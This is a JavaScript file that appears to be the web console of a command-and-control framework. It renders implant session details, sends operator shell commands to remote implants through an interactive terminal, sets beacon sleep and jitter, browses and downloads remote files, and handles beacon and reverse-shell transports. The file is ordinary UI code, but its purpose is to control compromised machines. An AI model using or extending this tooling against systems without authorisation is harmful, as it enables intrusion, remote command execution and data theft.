                            <button class="btn-ghost btn-sm" onclick="C2.goToParentDirectory()">⬆ ${escapeHtml(c2t('c2.files.parent'))}</button>
                            <button class="btn-ghost btn-sm" onclick="C2.refreshFiles()">${escapeHtml(c2t('c2.files.refresh'))}</button>
                            <button type="button" class="btn-ghost btn-sm" id="c2-file-upload-btn" onclick="C2.openFileUploadPicker()" title="${escapeHtml(c2t('c2.files.upload'))}">📤 ${escapeHtml(c2t('c2.files.upload'))}</button>
                            <input type="file" id="c2-file-upload-input" style="display:none" onchange="C2.onC2FileUploadPick(event)" />
                            <span id="c2-current-path" class="c2-path-breadcrumb">/</span>
                        </div>
                        <div id="c2-file-upload-hint" class="c2-file-upload-hint" hidden role="status"></div>
                        <div id="c2-file-upload-progress" class="c2-file-upload-progress" hidden role="status" aria-live="polite">
                            <div class="c2-file-upload-progress-track" aria-hidden="true"><div class="c2-file-upload-progress-fill" id="c2-file-upload-progress-fill"></div></div>
                            <span class="c2-file-upload-progress-label" id="c2-file-upload-progress-label"></span>
                        </div>
                        <div id="c2-file-list" class="c2-file-list"></div>
                    </div>
                    <div id="c2-tab-tasks" class="c2-tab-panel" style="display:none;">
                        <div id="c2-session-tasks-list" class="c2-task-list-compact"></div>
                    </div>
                    <div id="c2-tab-info" class="c2-tab-panel" style="display:none;">
                        <div class="c2-info-grid">
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoSessionId'))}:</strong> ${s.id}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoImplantUuid'))}:</strong> ${s.implantUuid}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoHostname'))}:</strong> ${escapeHtml(s.hostname)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoUsername'))}:</strong> ${escapeHtml(s.username)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoOs'))}:</strong> ${s.os}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoArch'))}:</strong> ${s.arch}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoPid'))}:</strong> ${s.pid}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoProcess'))}:</strong> ${escapeHtml(s.processName || '-')}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoAdmin'))}:</strong> ${escapeHtml(adminVal)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoInternalIp'))}:</strong> ${s.internalIp || '-'}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoSleep'))}:</strong> ${escapeHtml(sleepLine)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoFirstSeen'))}:</strong> ${formatTime(s.firstSeenAt)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoLastCheckin'))}:</strong> ${formatTime(s.lastCheckIn)}</div>
                            <div><strong>${escapeHtml(c2t('c2.sessions.infoNote'))}:</strong> ${escapeHtml(s.note || '-')}</div>
                        </div>
                    </div>
                </div>
            </div>
        `;

        var isCurlBeacon = s.implantUuid && s.implantUuid.startsWith('curl_');
        if (isCurlBeacon) {
            var termContainer = container.querySelector('#c2-terminal-container');
            if (termContainer) {
                termContainer.innerHTML =
                    '<div style="padding:24px;color:#94a3b8;text-align:center;line-height:1.8;">' +
                    '<div style="font-size:32px;margin-bottom:12px;">📡</div>' +
                    '<div style="font-size:14px;font-weight:600;color:#e2e8f0;margin-bottom:8px;">' + escapeHtml(c2t('c2.sessions.curlBeaconTitle')) + '</div>' +
                    '<div style="font-size:12px;">' + c2t('c2.sessions.curlBeaconBody').split('\n').map(function (ln) { return escapeHtml(ln); }).join('<br>') + '</div>' +
                    '</div>';
            }
        }
        setTimeout(() => {
            if (!isCurlBeacon) C2.initTerminal();
            C2.loadFileList(s.id, '.');
            C2.loadSessionTasks(s.id);
            C2.updateFileUploadButton(s);
            C2.ensureListenersLoaded().then(function() {
                C2.updateFileUploadButton(s);
            });
        }, 50);
    };

    C2.switchTab = function(tab) {
        document.querySelectorAll('.c2-session-tab').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.c2-tab-panel').forEach(el => el.style.display = 'none');
        
        const tabEl = document.querySelector(`.c2-session-tab[data-tab="${tab}"]`);
        if (tabEl) tabEl.classList.add('active');
        
        const panel = document.getElementById(`c2-tab-${tab}`);
        if (panel) panel.style.display = 'block';

        if (tab === 'terminal') {
            setTimeout(function () {
                C2.fitTerminal();
                if (C2.terminalInstance) C2.terminalInstance.focus();
            }, 50);
        }
    };

    C2.setSessionSleep = function(id) {
        const sleep = prompt(c2t('c2.sessions.promptSleepSeconds'), '5');
        if (!sleep) return;
        const jitter = prompt(c2t('c2.sessions.promptJitterPercent'), '0') || '0';
        
        apiRequest('PUT', `${API_BASE}/sessions/${id}/sleep`, {
            sleep_seconds: parseInt(sleep),
            jitter_percent: parseInt(jitter)
        }).then(data => {
            if (data.error) showToast(data.error, 'error');
            else showToast(c2t('c2.sessions.toastSleepUpdated'), 'success');
        });
    };

    C2.killSession = function(id) {
        if (!confirm(c2t('c2.sessions.confirmExitSession'))) return;
        apiRequest('POST', `${API_BASE}/tasks`, {
            session_id: id,
            task_type: 'exit',
            payload: {}
        }).then(data => {
            showToast(c2t('c2.sessions.toastExitSent'), 'success');
        });
    };

    C2.deleteSessionRecord = function(id) {
        if (!confirm(c2t('c2.sessions.confirmDeleteSession'))) return;
        apiRequest('DELETE', `${API_BASE}/sessions/${id}`, {}).then(data => {
            if (data.error) {
                showToast(data.error, 'error');
                return;
            }
            showToast(c2t('c2.sessions.toastSessionDeleted'), 'success');
            if (C2.selectedSessionId === id) C2.selectedSessionId = null;
            C2.loadSessions();
        });
    };

    // ============================================================================
    // xterm 终端
    // ============================================================================

    C2.serializeTerminalBuffer = function(term) {
        if (!term || !term.buffer || !term.buffer.active) return '';
        const buf = term.buffer.active;
        const lines = [];
        for (let i = 0; i < buf.length; i++) {
            const line = buf.getLine(i);
            if (line) lines.push(line.translateToString(true));
        }
        return lines.join('\n');
    };

    C2.pushTerminalHistory = function(cmd) {
        const sid = C2.selectedSessionId;
        if (!sid || !cmd) return;
        if (!C2.terminalHistory[sid]) C2.terminalHistory[sid] = [];
        const hist = C2.terminalHistory[sid];
        if (hist.length === 0 || hist[hist.length - 1] !== cmd) {
            hist.push(cmd);
            if (hist.length > 200) hist.shift();
        }
    };

    C2.finishTerminalCommand = function(term, status) {
        C2.terminalBusy = false;
        const statusEl = document.getElementById('c2-terminal-status');
        if (status === 'err' && statusEl) {
            statusEl.textContent = c2t('c2.sessions.termStatusErr');
        } else if (status === 'timeout' && statusEl) {
            statusEl.textContent = c2t('c2.sessions.termStatusTimeout');
        } else if (statusEl && C2.terminalQueue.length === 0) {
            statusEl.textContent = c2t('c2.sessions.termStatusReady');
        }
        if (C2.terminalQueue.length > 0) {
            const next = C2.terminalQueue.shift();
            C2.runTerminalCommand(next, term);
            return;
        }
        term.write('$ ');
        if (statusEl && status !== 'err' && status !== 'timeout') {
            statusEl.textContent = c2t('c2.sessions.termStatusReady');
        }
    };

    C2.runTerminalCommand = function(cmd, term) {
        if (!C2.selectedSessionId) {
            term.writeln('\x1b[31m' + c2t('c2.sessions.termNoSession') + '\x1b[0m');
            term.write('$ ');
            return;
        }
        C2.terminalBusy = true;
        C2.pushTerminalHistory(cmd);
        const statusEl = document.getElementById('c2-terminal-status');
        if (statusEl) statusEl.textContent = c2t('c2.sessions.termStatusExec');

        apiRequest('POST', `${API_BASE}/tasks`, {
            session_id: C2.selectedSessionId,
            task_type: 'shell',
            payload: { command: cmd, timeout_seconds: 60 }
        }).then(data => {
            if (data.error) {
                term.writeln(`\x1b[31mError: ${data.error}\x1b[0m`);
                C2.finishTerminalCommand(term, 'err');
            } else {
                C2.waitForTaskResult(data.task?.id || data.task_id, term);
            }
        }).catch(function () {
            term.writeln('\x1b[31mError: request failed\x1b[0m');
            C2.finishTerminalCommand(term, 'err');
        });
    };

    C2.executeInTerminal = function(cmd, term) {
        if (!cmd) {
            term.write('$ ');
            return;
        }
        if (C2.terminalBusy) {
            C2.terminalQueue.push(cmd);
            term.writeln('\x1b[33m' + c2t('c2.sessions.termQueued') + '\x1b[0m');
            return;
        }
        C2.runTerminalCommand(cmd, term);
    };

    C2.waitForTaskResult = function(taskId, term) {
        let attempts = 0;
        const maxAttempts = 60;
        let delay = 500;
        const maxDelay = 5000;
        const check = () => {
            if (++attempts > maxAttempts) {
                term.writeln('\x1b[33m' + c2t('c2.sessions.termWaitTimeout') + '\x1b[0m');
                C2.finishTerminalCommand(term, 'timeout');
                return;
            }
            apiRequest('GET', `${API_BASE}/tasks/${taskId}`).then(data => {
                const task = data.task;
                if (task && (task.status === 'success' || task.status === 'failed')) {
                    if (task.resultText) {
                        const lines = task.resultText.replace(/\r\n/g, '\n').replace(/\r/g, '\n').split('\n');
                        lines.forEach(line => term.writeln(line));
                    }
                    if (task.error) {
                        term.writeln(`\x1b[31m${task.error}\x1b[0m`);
                    }
                    C2.finishTerminalCommand(term, task.status === 'failed' ? 'err' : 'ready');
                } else {
                    delay = Math.min(delay * 1.5, maxDelay);
                    setTimeout(check, delay);
                }
            }).catch(function () {
                C2.finishTerminalCommand(term, 'err');
            });
        };
        check();
    };

    C2.initTerminal = function() {
        const container = document.getElementById('c2-terminal-container');
        if (!container || typeof Terminal === 'undefined') return;

        if (C2.terminalInstance && C2.terminalSessionId) {
            C2.terminalLogs[C2.terminalSessionId] = C2.serializeTerminalBuffer(C2.terminalInstance);
        }
        if (C2.terminalInstance) {
            C2.terminalInstance.dispose();
        }

        const sessionId = C2.selectedSessionId || '_none';
        C2.terminalSessionId = sessionId;
        C2.terminalQueue = [];
        C2.terminalBusy = false;

        const term = new Terminal({
            cursorBlink: true,
            cursorStyle: 'block',
            fontSize: 14,
            fontFamily: 'Menlo, Monaco, "Courier New", monospace',
            lineHeight: 1.3,
            scrollback: 5000,
            theme: {
                background: '#0d1117',
                foreground: '#e6edf3',
                cursor: '#58a6ff',
                cursorAccent: '#0d1117',
                selection: 'rgba(88, 166, 255, 0.3)'
            }
        });

        if (typeof FitAddon !== 'undefined') {
            const FitCtor = FitAddon.FitAddon || FitAddon;
            C2.terminalFitAddon = new FitCtor();
            term.loadAddon(C2.terminalFitAddon);
        }

        term.open(container);
        try {
            if (C2.terminalFitAddon) C2.terminalFitAddon.fit();
        } catch (e) {}

        let lineBuffer = '';
        let cursorIndex = 0;
        let historyIndex = -1;
        let lastPasteAt = 0;
        let lastPasteText = '';
        const prompt = '$ ';

        function redrawInputLine() {
            term.write('\x1b[2K\r' + prompt + lineBuffer);
            const tail = lineBuffer.length - cursorIndex;
            if (tail > 0) term.write('\x1b[' + tail + 'D');
        }

        function resetInputLine() {
            lineBuffer = '';
            cursorIndex = 0;
            historyIndex = -1;
            term.write('\x1b[2K\r' + prompt);
        }

        function insertPlainText(text) {
            const safe = String(text).replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]/g, '');
            if (!safe) return;
            lineBuffer = lineBuffer.slice(0, cursorIndex) + safe + lineBuffer.slice(cursorIndex);
            cursorIndex += safe.length;
            redrawInputLine();
        }

        function deleteWordBeforeCursor() {
            if (cursorIndex === 0) return;
            let start = cursorIndex;
            while (start > 0 && /\s/.test(lineBuffer[start - 1])) start--;
            while (start > 0 && !/\s/.test(lineBuffer[start - 1])) start--;
            lineBuffer = lineBuffer.slice(0, start) + lineBuffer.slice(cursorIndex);
            cursorIndex = start;
            redrawInputLine();
        }

        function moveWordLeft() {
            if (cursorIndex === 0) return;
            let pos = cursorIndex;
            while (pos > 0 && /\s/.test(lineBuffer[pos - 1])) pos--;
            while (pos > 0 && !/\s/.test(lineBuffer[pos - 1])) pos--;
            const delta = cursorIndex - pos;
            if (delta > 0) {
                term.write('\x1b[' + delta + 'D');
                cursorIndex = pos;
            }
        }

        function moveWordRight() {
            if (cursorIndex >= lineBuffer.length) return;
            let pos = cursorIndex;
            while (pos < lineBuffer.length && /\s/.test(lineBuffer[pos])) pos++;
            while (pos < lineBuffer.length && !/\s/.test(lineBuffer[pos])) pos++;
            const delta = pos - cursorIndex;
            if (delta > 0) {
                term.write('\x1b[' + delta + 'C');
                cursorIndex = pos;
            }
        }

        function showHistoryEntry(entry) {
            lineBuffer = entry || '';
            cursorIndex = lineBuffer.length;
            term.write('\x1b[2K\r' + prompt + lineBuffer);
        }

        function submitCurrentLine() {
            if (C2.terminalBusy) {
                term.writeln('');
                term.writeln('\x1b[33m' + c2t('c2.sessions.termWaitFinish') + '\x1b[0m');
                term.write(prompt + lineBuffer);
                const tail = lineBuffer.length - cursorIndex;
                if (tail > 0) term.write('\x1b[' + tail + 'D');
                return;
            }
            term.writeln('');
            const cmd = lineBuffer.trim();
            lineBuffer = '';
            cursorIndex = 0;
            historyIndex = -1;
            if (cmd) {
                C2.executeInTerminal(cmd, term);
            } else {
                term.write(prompt);
            }
        }

        function handlePasteText(text) {
            const now = Date.now();
            if (text === lastPasteText && now - lastPasteAt < 80) return;
            lastPasteAt = now;
            lastPasteText = text;

            const normalized = String(text).replace(/\r\n/g, '\n').replace(/\r/g, '\n');
            if (normalized.indexOf('\n') === -1) {
                insertPlainText(normalized);
                return;
            }
            const endsWithNewline = normalized.endsWith('\n');
            const parts = normalized.split('\n');
            const tail = parts.pop() || '';
            parts.forEach(function (part) {
                insertPlainText(part);
                submitCurrentLine();
            });
            if (tail) insertPlainText(tail);
            else if (endsWithNewline && parts.length === 0) submitCurrentLine();
        }

        const savedLog = C2.terminalLogs[sessionId];
        if (savedLog) {
            term.write(String(savedLog).replace(/\r\n/g, '\n').replace(/\r/g, '\n').replace(/\n/g, '\r\n'));
            if (!savedLog.endsWith('\n')) term.write('\r\n');
        } else {
            term.writeln('\x1b[36m' + c2t('c2.sessions.terminalWelcome') + '\x1b[0m');
            term.writeln('');
        }
        term.write(prompt);

        term.onData(function (e) {
            if (e === '\x0c') {
                term.clear();
                resetInputLine();
                C2.terminalLogs[sessionId] = '';
                return;
            }
            if (e === '\x03') {
                if (C2.terminalBusy) {
                    term.writeln('');
                    term.writeln('\x1b[33m^C (' + c2t('c2.sessions.termCtrlC') + ')\x1b[0m');
                }
                resetInputLine();
                return;
            }
            if (e === '\x16') {
                if (navigator.clipboard && navigator.clipboard.readText) {
                    navigator.clipboard.readText().then(handlePasteText).catch(function () {});
                }
                return;
            }
            if (e.length > 1 && e.indexOf('\x1b') !== 0) {
                handlePasteText(e);
                return;
            }
            if (e === '\x1b[D' || e === '\x1bOD') {
                if (cursorIndex > 0) {
                    cursorIndex--;
                    term.write('\x1b[D');
                }
                return;
            }
            if (e === '\x1b[C' || e === '\x1bOC') {
                if (cursorIndex < lineBuffer.length) {
                    cursorIndex++;
                    term.write('\x1b[C');
                }
                return;
            }
            if (e === '\x1b[1;3D' || e === '\x1bb') {
                moveWordLeft();
                return;
            }
            if (e === '\x1b[1;3C' || e === '\x1bf') {
                moveWordRight();
                return;
            }
            if (e === '\x1b[A' || e === '\x1bOA') {
                const hist = C2.terminalHistory[sessionId] || [];
                if (hist.length === 0) return;
                historyIndex = historyIndex < 0 ? hist.length - 1 : Math.max(0, historyIndex - 1);
                showHistoryEntry(hist[historyIndex]);
                return;
            }
            if (e === '\x1b[B' || e === '\x1bOB') {
                const hist = C2.terminalHistory[sessionId] || [];
                if (hist.length === 0) return;
                historyIndex = historyIndex < 0 ? -1 : Math.min(hist.length - 1, historyIndex + 1);
                if (historyIndex < 0) showHistoryEntry('');
                else showHistoryEntry(hist[historyIndex]);
                return;
            }
            if (e === '\x1b[H' || e === '\x1bOH' || e === '\x01') {
                if (cursorIndex > 0) {
                    term.write('\x1b[' + cursorIndex + 'D');
                    cursorIndex = 0;
                }
                return;
            }
            if (e === '\x1b[F' || e === '\x1bOF' || e === '\x05') {
                const move = lineBuffer.length - cursorIndex;
                if (move > 0) {
                    term.write('\x1b[' + move + 'C');
                    cursorIndex = lineBuffer.length;
                }
                return;
            }
            if (e === '\x1b[3~') {
                if (cursorIndex < lineBuffer.length) {
                    lineBuffer = lineBuffer.slice(0, cursorIndex) + lineBuffer.slice(cursorIndex + 1);
                    redrawInputLine();
                }
                return;
            }
            if (e === '\x15') {
                resetInputLine();
                return;
            }
            if (e === '\x0b') {
                lineBuffer = lineBuffer.slice(0, cursorIndex);
                redrawInputLine();
                return;
            }
            if (e === '\x17') {
                deleteWordBeforeCursor();
                return;
            }
            if (e === '\x1b\x7f') {
                deleteWordBeforeCursor();
                return;
            }

            const code = e.charCodeAt(0);
            if (code === 13 || code === 10) {
                submitCurrentLine();
            } else if (code === 127 || code === 8) {
                if (cursorIndex > 0) {
                    lineBuffer = lineBuffer.slice(0, cursorIndex - 1) + lineBuffer.slice(cursorIndex);
                    cursorIndex--;
                    redrawInputLine();
                }
            } else if (e.length === 1 && code >= 32) {
                historyIndex = -1;
                lineBuffer = lineBuffer.slice(0, cursorIndex) + e + lineBuffer.slice(cursorIndex);
                cursorIndex++;
                if (cursorIndex === lineBuffer.length) {
                    term.write(e);
                } else {
                    redrawInputLine();
                }
            }
        });

        const onTerminalPaste = function (ev) {
            const text = ev.clipboardData && ev.clipboardData.getData('text');
            if (!text) return;
            ev.preventDefault();
            handlePasteText(text);
        };
        if (term.element) {
            term.element.addEventListener('paste', onTerminalPaste);
        }

        term.attachCustomKeyEventHandler(function (ev) {
            if (ev.type !== 'keydown') return true;
            if ((ev.ctrlKey || ev.metaKey) && !ev.shiftKey && (ev.key === 'c' || ev.key === 'C')) {
                if (term.getSelection()) return true;
            }
            const isPaste = (ev.ctrlKey || ev.metaKey) && !ev.shiftKey && !ev.altKey
                && (ev.key === 'v' || ev.key === 'V');
            if (isPaste && navigator.clipboard && navigator.clipboard.readText) {
                ev.preventDefault();
                navigator.clipboard.readText().then(handlePasteText).catch(function () {});
                return false;
            }
            if (ev.shiftKey && ev.key === 'Insert' && navigator.clipboard && navigator.clipboard.readText) {
                ev.preventDefault();
                navigator.clipboard.readText().then(handlePasteText).catch(function () {});
                return false;
            }
            return true;
        });

        container.addEventListener('click', function () {
            term.focus();
        });
        container.setAttribute('tabindex', '0');

        C2.terminalInstance = term;

        if (C2.terminalResizeObserver) {
            C2.terminalResizeObserver.disconnect();
        }
        C2.terminalResizeObserver = new ResizeObserver(function () {
            C2.fitTerminal();
        });
        C2.terminalResizeObserver.observe(container);

        setTimeout(function () {
            try {
                if (C2.terminalFitAddon) C2.terminalFitAddon.fit();
                term.focus();
            } catch (e) {}
        }, 100);
    };

    C2.fitTerminal = function() {
        if (C2.terminalFitAddon && C2.terminalInstance) {
            try {
                C2.terminalFitAddon.fit();
            } catch (e) {}
        }
    };

    C2.clearTerminal = function() {
        if (C2.terminalInstance) {
            C2.terminalInstance.clear();
            C2.terminalInstance.writeln('\x1b[36m' + c2t('c2.sessions.termCleared') + '\x1b[0m');
            C2.terminalInstance.write('$ ');
            if (C2.terminalSessionId) {
                C2.terminalLogs[C2.terminalSessionId] = C2.serializeTerminalBuffer(C2.terminalInstance);
            }
        }
        C2.terminalQueue = [];
    };

    C2.copyTerminal = function() {
        if (!C2.terminalInstance) return;
        const text = C2.terminalInstance.getSelection();
        if (text) copyToClipboard(text);
        else showToast(c2t('c2.sessions.termNoSelection'), 'warning');
    };

    // ============================================================================
    // 文件管理
    // ============================================================================

    C2.normalizeFilePath = function(path) {
        var p = path == null ? '.' : String(path).trim();
        if (!p || p === '/') return '.';
        p = p.replace(/\\/g, '/').replace(/\/+/g, '/').replace(/\/+$/, '');
        return p || '.';
    };

    C2.joinFilePath = function(base, name) {
        var b = C2.normalizeFilePath(base);
        var n = String(name || '').trim().replace(/\\/g, '/').replace(/^\/+/, '');
        if (!n) return b;
        if (b === '.' || b === '/') return n;
        return b + '/' + n;
    };

    /** 将相对浏览路径解析为 implant 工作目录下的绝对路径 */
    C2.resolvePathAgainstPwd = function(pwd, rel) {
        var base = String(pwd || '').trim().replace(/\\/g, '/').replace(/\/+$/, '');
        if (!base) base = '/';
        if (!base.startsWith('/')) base = '/' + base;
        var parts = String(rel || '.').replace(/\\/g, '/').split('/');
        var stack = base === '/' ? [] : base.split('/').filter(Boolean);
        for (var i = 0; i < parts.length; i++) {
            var p = parts[i];
            if (!p || p === '.') continue;
            if (p === '..') {
                if (stack.length) stack.pop();
            } else {
                stack.push(p);
            }
        }
        return '/' + stack.join('/');
    };

    /** 将 /d:/path/file 转为 Windows 远程路径 d:\path\file */
    C2.toWindowsRemotePath = function(path) {
        var p = String(path || '').trim().replace(/\\/g, '/');
        if (/^\/[a-zA-Z]:\//.test(p)) {
            p = p.slice(1);
        }
        return p.replace(/\//g, '\\');
    };

    C2.sessionIsWindows = function(session) {
        if (!session) return false;
        return String(session.os || '').toLowerCase().indexOf('windows') >= 0;
    };

    C2.resolveRemotePath = function(browsePath, filename) {
        var joined = C2.joinFilePath(browsePath || '.', filename);
        if (!C2.implantPwd) return joined;
        var resolved = C2.resolvePathAgainstPwd(C2.implantPwd, joined);
        var session = null;
        if (C2.selectedSessionId && C2.sessions) {
            session = C2.sessions.find(function(s) { return s.id === C2.selectedSessionId; });
        }
        if (C2.sessionIsWindows(session)) {
            return C2.toWindowsRemotePath(resolved);
        }
        return resolved;
    };

    C2.updateFileBreadcrumb = function(browsePath) {
        var breadcrumb = document.getElementById('c2-current-path');
        if (!breadcrumb) return;
        var rel = C2.normalizeFilePath(browsePath || '.');
        if (C2.implantPwd) {
            breadcrumb.textContent = C2.resolvePathAgainstPwd(C2.implantPwd, rel);
            breadcrumb.title = rel;
        } else {
            breadcrumb.textContent = rel;
            breadcrumb.title = '';
        }
    };

    C2.parseLsLine = function(line) {
        var trimmed = String(line || '').trim();
        if (!trimmed || /^total\s+\d+/i.test(trimmed)) return null;

        // Beacon 结构化输出：type\tmode\tsize\tname
        var beaconParts = trimmed.split('\t');
        if (beaconParts.length >= 4) {
            var bName = beaconParts.slice(3).join('\t').trim();
            var bMode = beaconParts[1].trim();
            var bType = beaconParts[0].trim();
            if (bName && bName !== '.' && bName !== '..') {
                return {
                    mode: bMode || bType,
                    size: beaconParts[2].trim(),
                    name: bName,
                    isDir: bType.charAt(0) === 'd' || bMode.charAt(0) === 'd'
                };
            }
            return null;
        }

        // 原生 ls -l 输出
        var m = trimmed.match(/^(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$/);
        if (!m) return null;
        var name = m[9].trim();
        var arrow = name.indexOf(' -> ');
        if (arrow > 0) name = name.slice(0, arrow).trim();
        if (!name || name === '.' || name === '..') return null;
        return {
            mode: m[1],
            size: m[5],
            name: name,
            isDir: m[1].charAt(0) === 'd'
        };
    };

    C2.isDownloadShellError = function(text) {
        var lower = String(text || '').toLowerCase();
        return lower.indexOf('c2_download_err:') >= 0 ||
            lower.indexOf('no such file') >= 0 ||
            lower.indexOf('permission denied') >= 0 ||
            lower.indexOf('is a directory') >= 0 ||
            lower.indexOf('cannot open') >= 0 ||
            lower.indexOf('not a regular file') >= 0;
    };

    C2.refreshImplantPwd = function(sessionId, callback) {
        if (!sessionId) {
            if (callback) callback();
            return;
        }
        apiRequest('POST', `${API_BASE}/tasks`, {
            session_id: sessionId,
            task_type: 'pwd',
            payload: {}
        }).then(function(data) {
            if (data.error) {
                if (callback) callback();
                return;
            }
            var taskId = data.task && data.task.id ? data.task.id : data.task_id;
            if (!taskId) {
                if (callback) callback();
                return;
            }
            C2.waitForImplantPwd(taskId, callback);
        }).catch(function() {
            if (callback) callback();
        });
    };

    C2.waitForImplantPwd = function(taskId, callback) {
        var attempts = 0;
        var poll = function() {
            if (++attempts > 30) {
                if (callback) callback();
                return;
            }
            apiRequest('GET', `${API_BASE}/tasks/${taskId}`).then(function(data) {
                var task = data.task;
                if (task && task.status === 'success' && task.resultText) {
                    C2.implantPwd = String(task.resultText).trim().split('\n').pop().trim();
                    C2.updateFileBreadcrumb(C2.currentPath);
                    if (callback) callback();
                } else if (task && task.status === 'failed') {
                    if (callback) callback();
                } else {
                    setTimeout(poll, 300);
                }
            });
        };
        poll();
    };

    C2.getParentFilePath = function(path) {
        var p = C2.normalizeFilePath(path);
        if (p === '.' || p === '/') return '.';
        var idx = p.lastIndexOf('/');
        if (idx < 0) return '.';
        var parent = p.slice(0, idx);
        return parent || '.';
    };

    C2.goToParentDirectory = function() {
        var parent = C2.getParentFilePath(C2.currentPath || '.');
        C2.loadFileList(null, parent);
    };

    C2.openDirectory = function(name) {
        var next = C2.joinFilePath(C2.currentPath || '.', name);
        C2.loadFileList(null, next);
    };

    C2.loadFileList = function(sessionId, path) {
        // 兼容误传：仅传路径时（如旧版 loadFileList('..')）自动纠正
        if (sessionId && path == null && typeof sessionId === 'string' &&
            (sessionId === '..' || sessionId === '.' || sessionId.indexOf('/') >= 0)) {
            path = sessionId;
            sessionId = null;
        }
        if (!sessionId) sessionId = C2.selectedSessionId;
        if (!sessionId) return;
        if (!path) path = C2.currentPath || '.';
        path = C2.normalizeFilePath(path);

        const container = document.getElementById('c2-file-list');
        const breadcrumb = document.getElementById('c2-current-path');
        
        if (container) container.innerHTML = '<div class="c2-loading">' + escapeHtml(c2t('c2.files.loading')) + '</div>';

        apiRequest('POST', `${API_BASE}/tasks`, {
            session_id: sessionId,
            task_type: 'ls',
            payload: { path: path }
        }).then(data => {
            if (data.error) {
                if (container) container.innerHTML = `<div class="c2-error">${data.error}</div>`;
                return;
            }
            C2.waitForFileList(data.task?.id || data.task_id, sessionId, path);
        });
    };

    C2.waitForFileList = function(taskId, sessionId, path) {
        let attempts = 0;
        const container = document.getElementById('c2-file-list');
        const check = () => {
            if (++attempts > 60) {
                if (container) container.innerHTML = '<div class="c2-error">' + escapeHtml(c2t('c2.files.timeout')) + '</div>';
                return;
            }
            apiRequest('GET', `${API_BASE}/tasks/${taskId}`).then(data => {
                const task = data.task;
                if (task && task.status === 'success') {
                    C2.currentPath = path;
                    C2.updateFileBreadcrumb(path);
                    C2.renderFileList(task.resultText || '');
                    C2.refreshImplantPwd(sessionId);
                } else if (task && task.status === 'failed') {
                    if (container) container.innerHTML = `<div class="c2-error">${escapeHtml(task.error || c2t('c2.files.failed'))}</div>`;
                } else {
                    setTimeout(check, 500);
                }
            });
        };
        check();
    };

    C2.renderFileList = function(output) {
        const container = document.getElementById('c2-file-list');
        if (!container) return;

        const entries = output.split('\n')
            .map(C2.parseLsLine)
            .filter(function(entry) { return entry != null; });
        if (entries.length === 0) {
            container.innerHTML = '<div class="c2-empty">' + escapeHtml(c2t('c2.files.emptyDir')) + '</div>';
            return;
        }

        container.innerHTML = `
            <table class="c2-file-table">
                <thead>
                    <tr>
                        <th>${escapeHtml(c2t('c2.files.colName'))}</th>
                        <th>${escapeHtml(c2t('c2.files.colSize'))}</th>
                        <th>${escapeHtml(c2t('c2.files.colMode'))}</th>
                        <th>${escapeHtml(c2t('c2.files.colActions'))}</th>
                    </tr>
                </thead>
                <tbody>
                    ${entries.map(function(entry) {
                        return `
                            <tr>
                                <td class="c2-file-name">
                                    <span class="c2-file-icon">${entry.isDir ? '📁' : '📄'}</span>
                                    ${escapeHtml(entry.name)}
                                </td>
                                <td>${escapeHtml(entry.size)}</td>
                                <td>${escapeHtml(entry.mode)}</td>
                                <td>
                                    ${entry.isDir
                                        ? `<button class="btn-ghost btn-sm" onclick='C2.openDirectory(${JSON.stringify(entry.name)})'>${escapeHtml(c2t('c2.files.open'))}</button>`
                                        : `<button class="btn-ghost btn-sm" onclick='C2.downloadFile(${JSON.stringify(entry.name)})'>${escapeHtml(c2t('c2.files.download'))}</button>`
                                    }
                                </td>
                            </tr>
                        `;
                    }).join('')}
                </tbody>
            </table>
        `;
    };

    C2.refreshFiles = function() {
        C2.loadFileList(null, C2.currentPath);
    };

    C2.sessionTransport = function(session) {
        if (!session || !session.metadata) return '';
        return String(session.metadata.transport || '').toLowerCase();
    };

    C2.sessionSupportsUpload = function(session) {
        if (!session) {
            return { supported: false, reasonKey: 'c2.files.uploadUnsupported' };
        }
        if (session.implantUuid && String(session.implantUuid).indexOf('curl_') === 0) {
            return { supported: false, reasonKey: 'c2.files.uploadCurlBeacon' };
        }
        var transport = C2.sessionTransport(session);
        // 编译 Beacon：HTTP/HTTPS/TCP(CSB1) 均走二进制/结构化协议，支持 upload
        if (transport === 'tcp_beacon' || transport === 'http_beacon' || transport === 'https_beacon') {
            return { supported: true, reasonKey: '' };
        }
        // 经典 TCP 反弹 Shell（bash/nc，metadata.transport=tcp_reverse）
        if (transport === 'tcp_reverse' || (session.hostname && String(session.hostname).indexOf('tcp_') === 0)) {
            return { supported: false, reasonKey: 'c2.files.uploadTcpShell' };
        }
        return { supported: true, reasonKey: '' };
    };

    C2.updateFileUploadButton = function(session) {
        if (!session && C2.selectedSessionId) {
            session = C2.sessions.find(function(s) { return s.id === C2.selectedSessionId; });
        }
        var btn = document.getElementById('c2-file-upload-btn');
        if (!btn) return;
        var cap = C2.sessionSupportsUpload(session);
        btn.disabled = !cap.supported || !!C2.fileUploadBusy;
        btn.title = cap.supported ? c2t('c2.files.upload') : c2t(cap.reasonKey);
        if (!cap.supported) {
            btn.classList.add('is-disabled');
        } else {
            btn.classList.remove('is-disabled');
        }
        var hint = document.getElementById('c2-file-upload-hint');
        if (hint) {
            if (!cap.supported) {
                hint.hidden = false;
                hint.textContent = c2t(cap.reasonKey);
            } else {
                hint.hidden = true;
                hint.textContent = '';
            }
        }
    };

    C2.setFileUploadProgress = function(visible, percent, filename) {
        var row = document.getElementById('c2-file-upload-progress');
        if (!row) return;
        if (!visible) {
            row.hidden = true;
            return;
        }
        row.hidden = false;
        var fill = document.getElementById('c2-file-upload-progress-fill');
        var label = document.getElementById('c2-file-upload-progress-label');
